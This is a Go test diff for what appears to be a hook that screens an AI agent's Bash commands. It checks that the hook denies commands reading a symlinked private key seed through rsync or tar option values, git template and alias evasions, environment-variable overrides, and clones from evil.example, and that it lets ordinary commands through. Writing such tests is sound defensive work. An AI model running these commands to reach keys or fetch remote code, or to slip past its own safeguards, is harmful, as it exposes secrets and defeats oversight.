@@ -1141,3 +1141,49 @@ func TestHookRefusesBundleListsAndFileURLGlobs(t *testing.T) {
 		})
 	}
 }
+
+func TestHookGuardsAttachedOptionValuesAndLocalConfiguration(t *testing.T) {
+	env := newHookBypassEnv(t, "observe_draft.v1.allow.json")
+	if err := os.Symlink(filepath.Join(env.dataDir, "keys", "workstation-ed25519.seed"), filepath.Join(env.home, "input")); err != nil {
+		t.Fatal(err)
+	}
+	for _, tc := range []struct{ command, reason string }{
+		{"rsync --files-from=input src/ dest/", "TRUST_MATERIAL_ACCESS_DENIED"},
+		{"rsync -a --password-file=input src/ dest/", "TRUST_MATERIAL_ACCESS_DENIED"},
+		{"tar --create --file=input notes.txt", "TRUST_MATERIAL_ACCESS_DENIED"},
+		{"CURL_HOME=/tmp/cfg curl file:///etc/hostname", "EGRESS_DESTINATION_UNDETERMINED"},
+		{"HOME=/tmp/cfg wget --version", "EGRESS_DESTINATION_UNDETERMINED"},
+		{"git clone --template=/tmp/template /absolute/local/repo /tmp/copy", "EGRESS_DESTINATION_UNDETERMINED"},
+		{"git -c init.templateDir=/tmp/template clone /absolute/local/repo /tmp/copy", "EGRESS_DESTINATION_UNDETERMINED"},
+		{"GIT_TEMPLATE_DIR=/tmp/template git clone /absolute/local/repo /tmp/copy", "EGRESS_DESTINATION_UNDETERMINED"},
+		{"git -c alias.x=clone x --template=/tmp/template /absolute/local/repo /tmp/copy", "EGRESS_DESTINATION_UNDETERMINED"},
+		{"git -c alias.x=clone x https://evil.example/r.git", "EGRESS_DESTINATION_UNDETERMINED"},
+		{"git x https://evil.example/r.git", "EGRESS_DESTINATION_UNDETERMINED"},
+		{"git -c alias.st=status st", "EGRESS_DESTINATION_UNDETERMINED"},
+		{"curl ${TARGET}-s", "EGRESS_DESTINATION_UNDETERMINED"},
+		{"tar --create --file=$HOME/input notes.txt", "TRUST_MATERIAL_ACCESS_DENIED"},
+	} {
+		denied, _, receipts := env.runAt(t, env.home, "Bash", map[string]any{"command": tc.command})
+		if !denied || len(receipts) == 0 {
+			t.Errorf("%s: denied=%v receipts=%s", tc.command, denied, describeReceipts(receipts))
+		}
+		for _, receipt := range receipts {
+			if receipt.Verdict != contracts.WorkstationVerdictDeny || receipt.ReasonCode != tc.reason {
+				t.Errorf("%s: wrong denial: %s", tc.command, describeReceipts(receipts))
+			}
+		}
+	}
+	for _, command := range []string{
+		"rsync --files-from=list.txt src/ dest/",
+		"tar --create --file=archive.tar notes.txt",
+		"curl file:///etc/hostname",
+		"CURL_HOME=/tmp/cfg curl -q file:///etc/hostname",
+		"git clone /absolute/local/repo /tmp/copy",
+		"git status",
+		"git -c alias.status=clone status",
+	} {
+		if denied, _, receipts := env.runAt(t, env.home, "Bash", map[string]any{"command": command}); denied {
+			t.Errorf("ordinary %q refused: %s", command, describeReceipts(receipts))
+		}
+	}
+}
